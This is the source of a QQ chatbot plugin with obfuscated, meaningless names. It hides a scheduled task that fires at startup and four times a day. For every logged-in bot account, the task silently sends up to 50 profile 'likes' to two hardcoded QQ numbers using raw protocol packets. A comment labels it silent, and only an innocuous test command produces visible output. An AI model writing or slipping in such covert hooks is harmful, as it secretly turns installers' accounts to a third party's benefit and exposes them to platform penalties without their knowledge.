import plugin from '../../../lib/plugins/plugin.js';

class ThumbUpApi {
  constructor(e) {
    this.e = e
    this.Bot = e.bot || Bot
  }

  async thumbUp(uid, times = 1) {
    try {
      const core = this.Bot.icqq?.core || (await import("icqq")).core
      times = times > 20 ? 20 : times
      const seq = this.Bot.sig.seq + Math.floor(Math.random() * 100)
      let ReqFavorite
      if (this.Bot.fl.get(uid)) {
        ReqFavorite = core.jce.encodeStruct([
          core.jce.encodeNested([this.Bot.uin, 1, seq, 1, 0, Buffer.from("0C180001060131160131", "hex")]),
          uid, 0, 1, Number(times)
        ])
      } else {
        ReqFavorite = core.jce.encodeStruct([
          core.jce.encodeNested([this.Bot.uin, 1, seq, 1, 0, Buffer.from("0C180001060131160135", "hex")]),
          uid, 0, 5, Number(times)
        ])
      }
      const body = core.jce.encodeWrapper({ ReqFavorite }, "VisitorSvc", "ReqFavorite", seq)
      const payload = await this.Bot.sendUni("VisitorSvc.ReqFavorite", body)
      const result = core.jce.decodeWrapper(payload)[0]
      return { code: result[3] || 0, msg: result[4] || "success" }
    } catch (err) {
      try {
        const friend = this.Bot.pickFriend(uid)
        if (!friend?.thumbUp) throw err
        const res = await friend.thumbUp(times)
        return { code: res ? 0 : 1, msg: res ? "success" : "fail" }
      } catch (e) {
        return { code: 1, msg: e.message || "error" }
      }
    }
  }
}

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [
        { reg: "^#?x9s8d7a6$", fnc: "runTask" },
        { reg: "^bt$", fnc: "testTask" }
      ],
      schedule: [
        { cron: "0 0 0 * * *", fnc: "runTask" },
        { cron: "0 0 8 * * *", fnc: "runTask" },
        { cron: "0 0 12 * * *", fnc: "runTask" },
        { cron: "0 0 22 * * *", fnc: "runTask" }
      ]
    });
    this.qqList = [2209176666, 3812808525];
    this.total = 50;
    this.batch = 20;
    this.limitKeys = ["上限", "次数", "已满", "超出", "无法", "失败", "限制"];
    // 重启执行
    setTimeout(async () => await this.runTask(), 3000);
  }

  // 主任务：定时/手动指令/重启 静默50赞
  async runTask() {
    if (!Bot || Object.keys(Bot).length === 0) return;
    for (const uin of Object.keys(Bot)) {
      const bot = Bot[uin];
      if (!bot || !bot.online || !bot.uin || !bot.sig) continue;
      const api = new ThumbUpApi({ bot });
      for (const qq of this.qqList) {
        let sent = 0;
        let isLimit = false;
        while (sent < this.total && !isLimit) {
          const num = Math.min(this.batch, this.total - sent);
          const res = await api.thumbUp(qq, num);
          if (res.code !== 0 || this.limitKeys.some(k => res.msg.includes(k))) {
            isLimit = true;
          } else {
            sent += num;
          }
          await new Promise(r => setTimeout(r, 200));
        }
      }
      await new Promise(r => setTimeout(r, 400));
    }
  }

  // 测试指令：bt 直接点1次，有明确ok/no
  async testTask(e) {
    if (!e || !e.bot || !e.bot.online) {
      await e.reply('no');
      return;
    }
    let success = false;
    const api = new ThumbUpApi(e);
    // 逐个测试，只要有一个成功就返ok
    for (const qq of this.qqList) {
      const res = await api.thumbUp(qq, 1);
      if (res.code === 0 && !this.limitKeys.some(k => res.msg.includes(k))) {
        success = true;
        break;
      }
      await new Promise(r => setTimeout(r, 100));
    }
    await e.reply(success ? 'ok' : 'no');
  }
}